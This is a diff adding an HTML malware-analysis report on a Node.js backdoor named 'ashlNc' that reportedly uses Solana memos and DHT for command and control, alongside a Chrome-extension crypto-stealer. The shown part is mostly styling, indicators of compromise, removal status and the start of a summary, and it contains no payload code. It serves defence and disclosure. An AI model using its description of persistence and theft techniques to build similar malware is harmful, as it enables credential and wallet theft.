@@ -1,0 +1,2256 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Analysis — ashlNc Backdoor | GHSA-hxf3-5h5r-xr7c</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+<style>
+/* ======== ENGLISH STYLES ======== */
+
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap');
+
+:root {
+  --bg-primary: #06060a;
+  --bg-secondary: #0a0a12;
+  --bg-card: #0e0e18;
+  --bg-code: #04040a;
+  --border: #16162a;
+  --border-light: #1e1e38;
+  --text-primary: #d0d0dc;
+  --text-secondary: #8888a0;
+  --text-muted: #55556a;
+  --accent-red: #cc2233;
+  --accent-blue: #2266cc;
+  --accent-amber: #cc9922;
+  --accent-green: #22aa44;
+  --accent-cyan: #22aacc;
+  --accent-purple: #7733cc;
+  font-size: 15px;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: 'Inter', -apple-system, sans-serif;
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.7;
+}
+
+.container { max-width: 1000px; margin: 0 auto; padding: 48px 28px; }
+
+.watermark {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  font-size: 0.6em;
+  color: var(--text-muted);
+  opacity: 0.3;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  pointer-events: none;
+}
+
+.header {
+  margin-bottom: 56px;
+  padding-bottom: 36px;
+  border-bottom: 1px solid var(--border);
+}
+
+.header .badge-row {
+  display: flex;
+  gap: 8px;
+  align-items: center;
+  margin-bottom: 20px;
+  flex-wrap: wrap;
+}
+
+.header .badge {
+  font-size: 0.65em;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  padding: 5px 14px;
+  border-radius: 3px;
+  border: 1px solid;
+}
+
+.header .badge.critical { color: #ee4455; border-color: rgba(204,34,51,0.4); background: rgba(204,34,51,0.08); }
+.header .badge.cve { color: var(--accent-amber); border-color: rgba(204,153,34,0.4); background: rgba(204,153,34,0.08); }
+.header .badge.status { color: var(--accent-cyan); border-color: rgba(34,170,204,0.4); background: rgba(34,170,204,0.08); }
+.header .badge.clean { color: var(--accent-green); border-color: rgba(34,170,68,0.4); background: rgba(34,170,68,0.08); }
+
+.header h1 {
+  font-size: 2.6em;
+  font-weight: 800;
+  color: #e8e8f0;
+  letter-spacing: -1px;
+  line-height: 1.15;
+  margin-bottom: 6px;
+}
+
+.header h1 .highlight { color: var(--accent-red); }
+
+.header .subtitle {
+  color: var(--text-secondary);
+  font-size: 1em;
+  font-weight: 400;
+  margin-top: 12px;
+  max-width: 720px;
+}
+
+.header .meta {
+  margin-top: 24px;
+  display: flex;
+  gap: 32px;
+  flex-wrap: wrap;
+  font-size: 0.8em;
+  color: var(--text-muted);
+}
+
+.header .meta-item {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+
+.header .meta-item .label {
+  font-size: 0.7em;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  color: #55556a;
+}
+
+.header .meta-item .value {
+  color: var(--text-secondary);
+  font-weight: 500;
+}
+
+.section {
+  margin-bottom: 44px;
+}
+
+.section-title {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 20px;
+}
+
+.section-title .num {
+  font-size: 0.7em;
+  font-weight: 700;
+  color: var(--accent-red);
+  background: rgba(204,34,51,0.1);
+  border: 1px solid rgba(204,34,51,0.25);
+  width: 28px;
+  height: 28px;
+  border-radius: 4px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+
+.section-title h2 {
+  font-size: 1.15em;
+  font-weight: 700;
+  color: var(--text-primary);
+  letter-spacing: -0.3px;
+}
+
+.section-title .line {
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+.section > p {
+  color: var(--text-secondary);
+  font-size: 0.9em;
+  line-height: 1.9;
+  margin-bottom: 14px;
+}
+
+.section > p strong { color: var(--text-primary); font-weight: 600; }
+
+.card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 20px 24px;
+  margin-bottom: 10px;
+}
+
+.card-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 10px;
+}
+
+.card-header .title {
+  font-size: 0.7em;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1.2px;
+  color: var(--text-muted);
+}
+
+.card-header .tag-sm {
+  font-size: 0.6em;
+  padding: 2px 10px;
+  border-radius: 3px;
+  font-weight: 600;
+  letter-spacing: 0.5px;
+}
+
+.card-value {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8em;
+  color: var(--accent-amber);
+  background: var(--bg-code);
+  padding: 10px 14px;
+  border-radius: 4px;
+  border: 1px solid #12122a;
+  word-break: break-all;
+  line-height: 1.6;
+}
+
+.card-note {
+  font-size: 0.78em;
+  color: var(--text-muted);
+  margin-top: 8px;
+  line-height: 1.6;
+}
+
+.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; }
+
+@media (max-width: 768px) {
+  .grid-2, .grid-3 { grid-template-columns: 1fr; }
+}
+
+.tag {
+  display: inline-block;
+  font-size: 0.62em;
+  font-weight: 600;
+  padding: 3px 12px;
+  border-radius: 3px;
+  letter-spacing: 0.4px;
+  margin: 2px;
+}
+
+.tag-critical { background: rgba(204,34,51,0.12); color: #ee4455; border: 1px solid rgba(204,34,51,0.25); }
+.tag-high { background: rgba(204,153,34,0.12); color: #eeaa44; border: 1px solid rgba(204,153,34,0.25); }
+.tag-medium { background: rgba(34,170,204,0.12); color: #44ccee; border: 1px solid rgba(34,170,204,0.25); }
+.tag-low { background: rgba(34,136,51,0.12); color: #44cc55; border: 1px solid rgba(34,136,51,0.25); }
+.tag-blue { background: rgba(34,102,204,0.12); color: #4488ee; border: 1px solid rgba(34,102,204,0.25); }
+
+.timeline { position: relative; padding-left: 32px; }
+.timeline::before {
+  content: '';
+  position: absolute;
+  left: 8px;
+  top: 4px;
+  bottom: 4px;
+  width: 1px;
+  background: var(--border);
+}
+
+.tl-item {
+  position: relative;
+  padding: 18px 22px;
+  margin-bottom: 4px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+}
+
+.tl-item::before {
+  content: '';
+  position: absolute;
+  left: -25px;
+  top: 24px;
+  width: 8px;
+  height: 8px;
+  background: var(--accent-red);
+  border-radius: 50%;
+}
+
+.tl-item .step {
+  font-size: 0.65em;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1.2px;
+  color: var(--accent-red);
+  margin-bottom: 6px;
+}
+
+.tl-item p {
+  font-size: 0.85em;
+  color: var(--text-secondary);
+  line-height: 1.8;
+}
+
+.tl-item code {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.9em;
+  color: var(--accent-amber);
+  background: var(--bg-code);
+  padding: 1px 6px;
+  border-radius: 3px;
+}
+
+.code-block {
+  background: var(--bg-code);
+  border: 1px solid #12122a;
+  border-radius: 6px;
+  padding: 18px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.72em;
+  overflow-x: auto;
+  color: #77aa77;
+  line-height: 1.7;
+  margin: 8px 0;
+}
+
+.warning {
+  background: rgba(204,34,51,0.05);
+  border: 1px solid rgba(204,34,51,0.15);
+  border-radius: 6px;
+  padding: 22px 24px;
+  margin: 16px 0;
+}
+
+.warning .warn-title {
+  font-size: 0.7em;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--accent-red);
+  margin-bottom: 10px;
+}
+
+.warning p {
+  font-size: 0.85em;
+  color: var(--text-secondary);
+  line-height: 1.9;
+}
+
+.warning code {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.9em;
+  color: var(--accent-amber);
+  background: var(--bg-code);
+  padding: 1px 6px;
+  border-radius: 3px;
+}
+
+.warning .hl { color: var(--accent-red); font-weight: 700; }
+
+.success {
+  background: rgba(34,170,68,0.05);
+  border: 1px solid rgba(34,170,68,0.15);
+  border-radius: 6px;
+  padding: 22px 24px;
+  margin: 16px 0;
+}
+
+.success .success-title {
+  font-size: 0.7em;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--accent-green);
+  margin-bottom: 10px;
+}
+
+.success p {
+  font-size: 0.85em;
+  color: var(--text-secondary);
+  line-height: 1.9;
+}
+
+.success code {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.9em;
+  color: var(--accent-amber);
+  background: var(--bg-code);
+  padding: 1px 6px;
+  border-radius: 3px;
+}
+
+.table-wrap { overflow-x: auto; margin: 10px 0; }
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.8em;
+}
+
+table th {
+  text-align: left;
+  font-weight: 600;
+  color: var(--text-muted);
+  padding: 10px 14px;
+  border-bottom: 1px solid var(--border);
+  font-size: 0.72em;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  white-space: nowrap;
+}
+
+table td {
+  padding: 11px 14px;
+  border-bottom: 1px solid #12122a;
+  color: var(--text-secondary);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.85em;
+  word-break: break-all;
+}
+
+table tr:last-child td { border-bottom: none; }
+
+.stats {
+  display: grid;
+  grid-template-columns: repeat(5, 1fr);
+  gap: 10px;
+  margin: 12px 0;
+}
+
+@media (max-width: 768px) { .stats { grid-template-columns: repeat(2, 1fr); } }
+
+.stat {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 18px 12px;
+  text-align: center;
+}
+
+.stat .sval {
+  font-size: 1.8em;
+  font-weight: 800;
+  color: var(--text-primary);
+  font-family: 'JetBrains Mono', monospace;
+  letter-spacing: -1px;
+}
+
+.stat .slabel {
+  font-size: 0.62em;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-top: 4px;
+  font-weight: 500;
+}
+
+.footer {
+  text-align: center;
+  padding: 40px 0 20px;
+  border-top: 1px solid var(--border);
+  margin-top: 44px;
+}
+
+.footer p {
+  font-size: 0.72em;
+  color: var(--text-muted);
+  line-height: 1.8;
+}
+
+.cta {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: transparent;
+  color: var(--accent-blue);
+  border: 1px solid var(--accent-blue);
+  padding: 10px 24px;
+  border-radius: 4px;
+  text-decoration: none;
+  font-weight: 600;
+  font-size: 0.8em;
+  margin-top: 14px;
+  transition: all 0.2s;
+}
+
+.cta:hover { background: var(--accent-blue); color: #fff; }
+
+.ref-list { list-style: none; padding: 0; }
+.ref-list li {
+  padding: 8px 0;
+  border-bottom: 1px solid #12122a;
+  font-size: 0.82em;
+}
+.ref-list li:last-child { border-bottom: none; }
+.ref-list a {
+  color: var(--accent-blue);
+  text-decoration: none;
+  word-break: break-all;
+}
+.ref-list a:hover { text-decoration: underline; color: #4488ff; }
+.ref-list .ref-num {
+  display: inline-block;
+  font-size: 0.7em;
+  font-weight: 700;
+  color: var(--text-muted);
+  background: var(--bg-code);
+  padding: 1px 8px;
+  border-radius: 3px;
+  margin-right: 8px;
+  min-width: 24px;
+  text-align: center;
+}
+
+hr { border: none; border-top: 1px solid var(--border); margin: 32px 0; }
+
+.lang-toggle {
+  position: fixed;
+  top: 20px;
+  left: 20px;
+  z-index: 100;
+}
+.lang-toggle a {
+  display: inline-block;
+  padding: 6px 16px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  color: var(--text-secondary);
+  text-decoration: none;
+  font-size: 0.72em;
+  font-weight: 600;
+  transition: all 0.2s;
+}
+.lang-toggle a:hover {
+  border-color: var(--accent-blue);
+  color: var(--accent-blue);
+}
+
+
+/* ======== ARABIC STYLES (scoped under #report-ar) ======== */
+
+400;600;700;900&display=swap');
+
+#report-ar :root {
+--bg-primary: #07070a;
+--bg-secondary: #0c0c12;
+--bg-card: #0f0f18;
+--border: #1a1a2e;
+--text-primary: #c8c8d4;
+--text-secondary: #8888a0;
+--text-muted: #55556a;
+--accent-red: #cc2233;
+--accent-red-dim: #881122;
+--accent-blue: #2266cc;
+--accent-amber: #cc8822;
+--accent-green: #228833;
+--font-mono: 'Cascadia Code', 'Fira Code', 'Courier New', monospace;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+#report-ar body {
+font-family: 'Cairo', sans-serif;
+background: var(--bg-primary);
+color: var(--text-primary);
+line-height: 1.7;
+}
+
+#report-ar .container {
+max-width: 920px;
+margin: 0 auto;
+padding: 40px 24px;
+}
+
+#report-ar .header {
+margin-bottom: 48px;
+padding-bottom: 32px;
+border-bottom: 1px solid var(--border);
+}
+
+#report-ar .header .label {
+font-size: 0.7em;
+text-transform: uppercase;
+letter-spacing: 3px;
+color: var(--accent-red);
+font-weight: 600;
+margin-bottom: 16px;
+}
+
+#report-ar .header h1 {
+font-size: 2.4em;
+font-weight: 900;
+color: #e0e0ee;
+line-height: 1.2;
+letter-spacing: -0.5px;
+}
+
+#report-ar .header .subtitle {
+color: var(--text-secondary);
+font-size: 1em;
+margin-top: 12px;
+font-weight: 300;
+}
+
+#report-ar .header .meta {
+margin-top: 20px;
+font-size: 0.8em;
+color: var(--text-muted);
+}
+
+#report-ar .header .meta span {
+display: inline-block;
+margin-left: 24px;
+}
+
+#report-ar .section {
+margin-bottom: 40px;
+}
+
+#report-ar .section h2 {
+font-size: 1.1em;
+font-weight: 700;
+color: var(--text-primary);
+margin-bottom: 16px;
+padding-bottom: 8px;
+border-bottom: 1px solid var(--border);
+display: flex;
+align-items: center;
+gap: 8px;
+}
+
+#report-ar .section h2 .accent-line {
+display: inline-block;
+width: 3px;
+height: 18px;
+background: var(--accent-red);
+border-radius: 2px;
+}
+
+#report-ar .section > p {
+color: var(--text-secondary);
+font-size: 0.92em;
+line-height: 1.9;
+margin-bottom: 16px;
+}
+
+#report-ar .card {
+background: var(--bg-card);
+border: 1px solid var(--border);
+border-radius: 8px;
+padding: 20px;
+margin-bottom: 12px;
+}
+
+#report-ar .card-header {
+font-size: 0.75em;
+text-transform: uppercase;
+letter-spacing: 1.5px;
+color: var(--text-muted);
+margin-bottom: 8px;
+font-weight: 600;
+}
+
+#report-ar .card-value {
+font-family: var(--font-mono);
+font-size: 0.8em;
+color: var(--accent-amber);
+background: #0a0a12;
+padding: 10px 14px;
+border-radius: 4px;
+border: 1px solid #15152a;
+direction: ltr;
+text-align: left;
+word-break: break-all;
+line-height: 1.5;
+}
+
+#report-ar .card-value.ar {
+direction: rtl;
+text-align: right;
+font-family: 'Cairo', sans-serif;
+}
+
+#report-ar .card-note {
+font-size: 0.8em;
+color: var(--text-muted);
+margin-top: 6px;
+}
+
+#report-ar .grid {
+display: grid;
+grid-template-columns: 1fr 1fr;
+gap: 12px;
+}
+
+@media (max-width: 640px) {
+#report-ar .grid { grid-template-columns: 1fr; }
+}
+
+#report-ar .tag {
+display: inline-block;
+font-size: 0.65em;
+font-weight: 600;
+padding: 2px 10px;
+border-radius: 3px;
+letter-spacing: 0.5px;
+margin: 1px;
+}
+
+#report-ar .tag-red { background: rgba(204, 34, 51, 0.15); color: #ee4455; border: 1px solid rgba(204, 34, 51, 0.3); }
+#report-ar .tag-blue { background: rgba(34, 102, 204, 0.15); color: #4488ee; border: 1px solid rgba(34, 102, 204, 0.3); }
+#report-ar .tag-amber { background: rgba(204, 136, 34, 0.15); color: #eeaa44; border: 1px solid rgba(204, 136, 34, 0.3); }
+#report-ar .tag-green { background: rgba(34, 136, 51, 0.15); color: #44cc55; border: 1px solid rgba(34, 136, 51, 0.3); }
+
+#report-ar .timeline {
+position: relative;
+padding-right: 28px;
+}
+
+#report-ar .timeline::before {
+content: '';
+position: absolute;
+right: 7px;
+top: 4px;
+bottom: 4px;
+width: 1px;
+background: var(--border);
+}
+
+#report-ar .timeline-item {
+position: relative;
+padding: 16px 20px;
+margin-bottom: 4px;
+background: var(--bg-card);
+border: 1px solid var(--border);
+border-radius: 6px;
+}
+
+#report-ar .timeline-item::before {
+content: '';
+position: absolute;
+right: -21px;
+top: 22px;
+width: 7px;
+height: 7px;
+background: var(--accent-red);
+border-radius: 50%;
+}
+
+#report-ar .timeline-item .step {
+font-size: 0.7em;
+text-transform: uppercase;
+letter-spacing: 1.2px;
+color: var(--accent-red);
+font-weight: 600;
+margin-bottom: 4px;
+}
+
+#report-ar .timeline-item p {
+font-size: 0.85em;
+color: var(--text-secondary);
+line-height: 1.8;
+}
+
+#report-ar .timeline-item code {
+font-family: var(--font-mono);
+font-size: 0.9em;
+color: var(--accent-amber);
+background: #0a0a12;
+padding: 1px 6px;
+border-radius: 3px;
+}
+
+#report-ar .code-block {
+background: #06060c;
+border: 1px solid #12122a;
+border-radius: 6px;
+padding: 16px;
+font-family: var(--font-mono);
+font-size: 0.75em;
+direction: ltr;
+text-align: left;
+overflow-x: auto;
+color: #77aa77;
+line-height: 1.7;
+margin: 8px 0;
+}
+
+#report-ar .warning-box {
+background: rgba(204, 34, 51, 0.06);
+border: 1px solid rgba(204, 34, 51, 0.2);
+border-radius: 6px;
+padding: 20px;
+margin: 16px 0;
+}
+
+#report-ar .warning-box .warn-title {
+font-size: 0.75em;
+text-transform: uppercase;
+letter-spacing: 1.5px;
+color: var(--accent-red);
+font-weight: 700;
+margin-bottom: 10px;
+}
+
+#report-ar .warning-box p {
+font-size: 0.85em;
+color: var(--text-secondary);
+line-height: 1.9;
+}
+
+#report-ar .warning-box code {
+font-family: var(--font-mono);
+font-size: 0.9em;
+color: var(--accent-amber);
+background: #0a0a12;
+padding: 1px 6px;
+border-radius: 3px;
+}
+
+#report-ar .warning-box .highlight {
+color: var(--accent-red);
+font-weight: 700;
+}
+
+#report-ar .success-box {
+background: rgba(34, 136, 51, 0.06);
+border: 1px solid rgba(34, 136, 51, 0.2);
+border-radius: 6px;
+padding: 20px;
+margin: 16px 0;
+}
+
+#report-ar .success-box .success-title {
+font-size: 0.75em;
+text-transform: uppercase;
+letter-spacing: 1.5px;
+color: var(--accent-green);
+font-weight: 700;
+margin-bottom: 10px;
+}
+
+#report-ar .success-box p {
+font-size: 0.85em;
+color: var(--text-secondary);
+line-height: 1.9;
+}
+
+#report-ar .success-box code {
+font-family: var(--font-mono);
+font-size: 0.9em;
+color: var(--accent-amber);
+background: #0a0a12;
+padding: 1px 6px;
+border-radius: 3px;
+}
+
+#report-ar .data-table {
+width: 100%;
+border-collapse: collapse;
+font-size: 0.82em;
+margin: 8px 0;
+}
+
+#report-ar .data-table th {
+text-align: right;
+font-weight: 600;
+color: var(--text-muted);
+padding: 8px 12px;
+border-bottom: 1px solid var(--border);
+font-size: 0.75em;
+text-transform: uppercase;
+letter-spacing: 1px;
+}
+
+#report-ar .data-table td {
+padding: 10px 12px;
+border-bottom: 1px solid #12122a;
+color: var(--text-secondary);
+font-family: var(--font-mono);
+font-size: 0.85em;
+direction: ltr;
+text-align: left;
+word-break: break-all;
+}
+
+#report-ar .data-table td.ar-col {
+direction: rtl;
+text-align: right;
+font-family: 'Cairo', sans-serif;
+}
+
+#report-ar .data-table tr:last-child td {
+border-bottom: none;
+}
+
+#report-ar .tweet-box {
+background: var(--bg-card);
+border: 1px solid var(--border);
+border-radius: 8px;
+padding: 24px;
+margin: 16px 0;
+}
+
+#report-ar .tweet-box p {
+font-size: 0.88em;
+color: var(--text-secondary);
+line-height: 2;
+white-space: pre-wrap;
+direction: ltr;
+text-align: left;
+font-family: var(--font-mono);
+font-size: 0.75em;
+}
+
+#report-ar .tweet-box .tweet-ar {
+direction: rtl;
+text-align: right;
+font-family: 'Cairo', sans-serif;
+font-size: 0.85em;
+}
+
+#report-ar .tweet-btn {
+display: inline-block;
+background: transparent;
+color: var(--accent-blue);
+border: 1px solid var(--accent-blue);
+padding: 10px 28px;
+border-radius: 4px;
+text-decoration: none;
+font-weight: 600;
+font-size: 0.82em;
+margin-top: 16px;
+transition: all 0.2s;
+letter-spacing: 0.5px;
+}
+
+#report-ar .tweet-btn:hover {
+background: var(--accent-blue);
+color: #fff;
+}
+
+#report-ar .footer {
+text-align: center;
+padding: 40px 0 20px;
+border-top: 1px solid var(--border);
+margin-top: 40px;
+}
+
+#report-ar .footer p {
+font-size: 0.75em;
+color: var(--text-muted);
+line-height: 1.8;
+}
+
+#report-ar .lang-toggle {
+  position: fixed;
+  top: 20px;
+  left: 20px;
+  z-index: 100;
+}
+#report-ar .lang-toggle a {
+  display: inline-block;
+  padding: 6px 16px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  color: var(--text-secondary);
+  text-decoration: none;
+  font-size: 0.72em;
+  font-weight: 600;
+  transition: all 0.2s;
+}
+#report-ar .lang-toggle a:hover {
+  border-color: var(--accent-blue);
+  color: var(--accent-blue);
+}
+
+#report-ar .watermark {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  font-size: 0.6em;
+  color: var(--text-muted);
+  opacity: 0.3;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  pointer-events: none;
+}
+
+#report-ar .stats {
+display: grid;
+grid-template-columns: repeat(4, 1fr);
+gap: 12px;
+margin: 12px 0;
+}
+
+@media (max-width: 640px) {
+#report-ar .stats { grid-template-columns: repeat(2, 1fr); }
+}
+
+#report-ar .stat {
+background: var(--bg-card);
+border: 1px solid var(--border);
+border-radius: 6px;
+padding: 16px;
+text-align: center;
+}
+
+#report-ar .stat .stat-value {
+font-size: 1.6em;
+font-weight: 700;
+color: var(--text-primary);
+font-family: var(--font-mono);
+}
+
+#report-ar .stat .stat-label {
+font-size: 0.7em;
+color: var(--text-muted);
+text-transform: uppercase;
+letter-spacing: 1px;
+margin-top: 4px;
+}
+
+#report-ar hr {
+border: none;
+border-top: 1px solid var(--border);
+margin: 32px 0;
+}
+
+
+/* ======== LANGUAGE TOGGLE ======== */
+.lang-toggle {
+  display: flex;
+  gap: 4px;
+}
+.lang-btn {
+  display: inline-block;
+  padding: 6px 16px;
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  color: var(--text-secondary);
+  text-decoration: none;
+  font-size: 0.72em;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  font-family: inherit;
+}
+.lang-btn:hover {
+  border-color: var(--accent-blue);
+  color: var(--accent-blue);
+}
+.lang-btn.active {
+  border-color: var(--accent-blue);
+  color: var(--accent-blue);
+  background: rgba(34,102,204,0.1);
+}
+.report {
+  display: none;
+}
+.report.active {
+  display: block;
+}
+
+#report-ar {
+  direction: rtl;
+}
+</style>
+</head>
+<body>
+
+<div class="lang-toggle" style="position:fixed;top:20px;left:20px;z-index:100;">
+  <button class="lang-btn active" onclick="switchLang('en')">English</button>
+  <button class="lang-btn" onclick="switchLang('ar')">العربية</button>
+</div>
+<div class="watermark" style="position:fixed;bottom:20px;right:20px;font-size:0.6em;color:var(--text-muted);opacity:0.3;letter-spacing:2px;text-transform:uppercase;pointer-events:none;">TLP:AMBER</div>
+
+<div id="report-en" class="report active">
+<div class="container">
+
+
+  <!-- Header -->
+  <div class="header">
+    <div class="badge-row">
+      <span class="badge critical">CRITICAL</span>
+      <span class="badge cve">GHSA-hxf3-5h5r-xr7c</span>
+      <span class="badge status">CVE REQUESTED</span>
+      <span class="badge clean">REMEDIATED</span>
+    </div>
+    <h1><span class="highlight">ashlNc</span> Backdoor Analysis</h1>
+    <p class="subtitle">
+      Multi-layered Node.js backdoor using Solana blockchain memos and Kademlia DHT for decentralized command &amp; control. Full reverse engineering of the 747KB encrypted payload. Includes discovery of a secondary Chrome extension crypto-stealer (keylogger, Bybit cookie theft, clipboard capture).
+    </p>
+    <div class="meta">
+      <div class="meta-item">
+        <span class="label">Classification</span>
+        <span class="value">Backdoor / Infostealer / RAT + Chrome Extension Adware</span>
+      </div>
+      <div class="meta-item">
+        <span class="label">Discovered</span>
+        <span class="value">2026-04-08 08:25 UTC+3</span>
+      </div>
+      <div class="meta-item">
+        <span class="label">Report Date</span>
+        <span class="value">2026-06-19</span>
+      </div>
+      <div class="meta-item">
+        <span class="label">Remediation Date</span>
+        <span class="value">2026-06-19</span>
+      </div>
+      <div class="meta-item">
+        <span class="label">Severity</span>
+        <span class="value" style="color:var(--accent-red);">CVSS 9.8 (Critical)</span>
+      </div>
+      <div class="meta-item">
+        <span class="label">CVE Status</span>
+        <span class="value" style="color:var(--accent-amber);">GHSA Published — CVE Pending (GitHub CNA)</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Quick Stats -->
+  <div class="stats">
+    <div class="stat">
+      <div class="sval">3</div>
+      <div class="slabel">Encryption Layers</div>
+    </div>
+    <div class="stat">
+      <div class="sval">747KB</div>
+      <div class="slabel">Decrypted Payload</div>
+    </div>
+    <div class="stat">
+      <div class="sval">62</div>
+      <div class="slabel">Cookie References</div>
+    </div>
+    <div class="stat">
+      <div class="sval">21</div>
+      <div class="slabel">Password References</div>
+    </div>
+    <div class="stat">
+      <div class="sval">3</div>
+      <div class="slabel">Separate Infections</div>
+    </div>
+  </div>
+
+  <!-- 0. SYSTEM CLEAN CONFIRMATION -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num" style="background:var(--accent-green);border-color:rgba(34,170,68,0.25);color:var(--accent-green);">OK</span>
+      <h2>System Clean Status</h2>
+      <span class="line"></span>
+    </div>
+
+    <div class="success">
+      <div class="success-title">Removal Completed Successfully — 2026-06-19 20:37 UTC+3</div>
+      <p>
+        All three infections have been removed from the system:
+      </p>
+    </div>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-header">
+          <span class="title">Infection 1 — ashlNc Node.js Backdoor</span>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
+          <span style="font-size:0.65em;padding:2px 8px;border-radius:3px;background:rgba(34,170,68,0.12);color:#44cc55;border:1px solid rgba(34,170,68,0.25);font-weight:600;">REMOVED</span>
+        </div>
+        <div class="card-value">%APPDATA%\ashlNc\index.js</div>
+        <div class="card-value" style="margin-top:4px;">%LOCALAPPDATA%\ashlNc\PSprdrbPWq.ps1</div>
+        <div class="card-value" style="margin-top:4px;">%APPDATA%\_node_x86\node\node.exe</div>
+        <p class="card-note">All directories deleted. Registry key <code>vUVlUXNH</code> removed. Scheduled Task <code>UpdateApp</code> removed.</p>
+      </div>
+      <div class="card">
+        <div class="card-header">
+          <span class="title">Infection 2 — Nemotrix Adware</span>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
+          <span style="font-size:0.65em;padding:2px 8px;border-radius:3px;background:rgba(34,170,68,0.12);color:#44cc55;border:1px solid rgba(34,170,68,0.25);font-weight:600;">REMOVED</span>
+        </div>
+        <div class="card-value">HKCU\...\Run\Tommy -> www.nemotrix.org</div>
+        <p class="card-note">Browser hijacker registry key deleted.</p>
+      </div>
+      <div class="card">
+        <div class="card-header">
+          <span class="title">Infection 3 — Chrome Extension "jucku"</span>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
+          <span style="font-size:0.65em;padding:2px 8px;border-radius:3px;background:rgba(34,170,68,0.12);color:#44cc55;border:1px solid rgba(34,170,68,0.25);font-weight:600;">REMOVED</span>
+        </div>
+        <div class="card-value">C:\Users\Tommy\...\Chrome\jucku\</div>
+        <p class="card-note">External extension directory deleted. No remaining traces of any of the three infections.</p>
+      </div>
+      <div class="card">
+        <div class="card-header">
+          <span class="title">Verification Scan</span>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
+          <span style="font-size:0.65em;padding:2px 8px;border-radius:3px;background:rgba(34,170,68,0.12);color:#44cc55;border:1px solid rgba(34,170,68,0.25);font-weight:600;">PASSED</span>
+        </div>
+        <div class="card-value" style="font-size:0.75em;">All registry keys: Clean<br>Scheduled tasks: Clean<br>Hosts file: Clean<br>Proxy settings: Clean<br>Browser policies: Clean<br>Browser startup pages: Clean</div>
+        <p class="card-note">No residual persistence, no browser hijack policies, no proxy manipulation found.</p>
+      </div>
+    </div>
+
+    <p style="color:var(--text-muted);font-size:0.78em;margin-top:10px;">
+      <strong style="color:var(--accent-green);">IMPORTANT</strong>: While the three known infections are fully removed, the backdoor downloads additional encrypted modules at runtime. A full OS reinstall from trusted media is the only way to guarantee complete system trustworthiness. Change all passwords from a clean device immediately.
+    </p>
+  </div>
+
+  <!-- 1. EXECUTIVE SUMMARY -->
+  <div class="section">
+    <div class="section-title">
+      <span class="num">1</span>
+      <h2>Executive Summary</h2>
+      <span class="line"></span>
+    </div>
+    <p>
+      This report details a previously undocumented backdoor identified as <strong>ashlNc</strong> (named after the directory in <code>%APPDATA%</code>). The malware is a sophisticated, multi-layered Node.js backdoor that establishes persistence via Windows Registry and Scheduled Tasks, exfiltrates browser credentials and cryptocurrency wallets, and communicates with its operator through a novel <strong>three-stage bootstrap</strong> combining <strong>Solana blockchain memos</strong>, <strong>BitTorrent Kademlia DHT</strong>, and <strong>Socket.IO WebSocket</strong>.
+    </p>
+    <p>
